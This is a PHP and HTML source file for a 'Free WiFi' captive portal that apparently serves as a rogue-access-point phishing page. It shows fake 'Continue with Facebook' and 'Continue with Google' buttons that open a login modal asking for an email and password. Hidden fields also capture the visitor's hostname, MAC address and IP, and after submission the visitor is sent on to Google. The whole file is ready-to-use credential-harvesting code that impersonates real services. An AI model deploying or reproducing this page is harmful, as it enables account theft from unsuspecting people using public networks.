<?php

// Prevent caching of the page to ensure the latest content is always loaded
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

// Define the redirection destination after login
$destination = "https://www.google.com"; // Redirects users to Google after login

// Include external helper functions (ensure 'helper.php' exists in the same directory)
require_once('helper.php');

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign In</title>

    <!-- Prevent browser caching of the page -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <style>
        /* Global Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Full-page styling */
        html, body {
            height: 100%;
            overflow: hidden; /* Prevent scrolling */
        }

        /* Center login container */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Login container styling */
        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            width: 100%;
            max-width: 350px;
        }

        /* Button styles */
        .login-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 300px;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            transition: background 0.2s;
        }

        /* Facebook button styling */
        .facebook-btn {
            background-color: #1877f2;
            color: white;
        }

        .facebook-btn:hover {
            background-color: #166fe5;
        }

        /* Google button styling */
        .google-btn {
            background-color: white;
            color: black;
            border: 1px solid #ccc;
        }

        .google-btn:hover {
            background-color: #f0f0f0;
        }

        /* Button icon styling */
        .btn-icon {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }

        /* Modal Styling */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        /* Modal Content */
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 350px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        }

        .modal-logo {
            width: 48px;
            margin-bottom: 10px;
        }

        /* Input Field Styling */
        .input-field {
            width: 90%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        /* Login Button Inside Modal */
        .login-btn-modal {
            width: 95%;
            background-color: #1877f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }

        .login-btn-modal:hover {
            background-color: #166fe5;
        }

        /* Cancel button inside modal */
        .cancel-btn {
            display: block;
            margin-top: 15px;
            color: gray;
            font-size: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="login-container">
            <h2>Free WiFi</h2>
            <p>Login to Access Free WiFi</p>

            <!-- Facebook Login Button -->
            <button class="login-btn facebook-btn" onclick="openModal('facebook')">
                <img class="btn-icon" src="/assets/images/facebook.png" alt="Facebook Logo">
                Continue with Facebook
            </button>

            <!-- Google Login Button -->
            <button class="login-btn google-btn" onclick="openModal('google')">
                <img class="btn-icon" src="/assets/images/google.png" alt="Google Logo">
                Continue with Google
            </button>
        </div>
    </div>

    <!-- Modal for login -->
    <div id="loginModal" class="modal">
        <div class="modal-content">
            <img id="loginLogo" class="modal-logo" src="" alt="Platform Logo">
            <h3 id="loginTitle">Sign in with</h3>

            <!-- Login form submission -->
            <form method="POST" action="captiveportal/index.php">
                <input type="hidden" id="platform" name="platform" value="">
                <input type="hidden" name="destination" value="<?=$destination?>"> <!-- Redirects to the defined destination -->

                <!-- Email input -->
                <input type="email" name="email" class="input-field" placeholder="Email" required>

                <!-- Password input -->
                <input type="password" name="password" class="input-field" placeholder="Password" required>

                <!-- Hidden fields to capture user details -->
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">

                <!-- Submit login form -->
                <button type="submit" class="login-btn-modal">Log in</button>
            </form>

            <!-- Cancel login -->
            <span class="cancel-btn" onclick="closeModal()">Cancel</span>
        </div>
    </div>

    <script>
        // Function to open modal with the selected platform
        function openModal(platform) {
            var modal = document.getElementById("loginModal");
            var logo = document.getElementById("loginLogo");
            var title = document.getElementById("loginTitle");
            var platformInput = document.getElementById("platform");

            // Change modal content based on platform
            if (platform === "facebook") {
                logo.src = "/assets/images/facebook.png";
                title.innerText = "Sign in with Facebook";
                platformInput.value = "Facebook";
            } else if (platform === "google") {
                logo.src = "/assets/images/google.png";
                title.innerText = "Sign in with Google";
                platformInput.value = "Google";
            }

            // Display the modal
            modal.style.display = "flex";
        }

        // Function to close modal
        function closeModal() {
            document.getElementById("loginModal").style.display = "none";
        }
    </script>

</body>
</html>
